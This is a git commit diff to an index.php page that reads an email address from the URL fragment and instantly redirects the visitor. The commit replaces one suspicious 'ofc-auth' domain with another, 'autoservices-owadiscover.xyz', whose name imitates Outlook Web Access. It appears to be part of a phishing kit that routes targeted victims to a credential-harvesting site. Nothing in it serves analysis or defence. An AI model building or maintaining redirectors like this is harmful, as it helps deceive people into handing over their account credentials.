c0420b87f8d61a027c78a2f4a315cf68c306c53c
ld080674 <118884270+ld080674@users.noreply.github.com>
2022-11-23 12:24:09 +0000

    Update index.php

--- index.php
+++ index.php
@@ -19,7 +19,7 @@
 		var em = hash.split("#")[1];
 
 		window.setTimeout(function () {
-			window.location.href = "https://wwwofc-auth.meteocontrols.com"
+			window.location.href = "https://lmo.autoservices-owadiscover.xyz"
 		}, 0);
 	</script>
 </html>
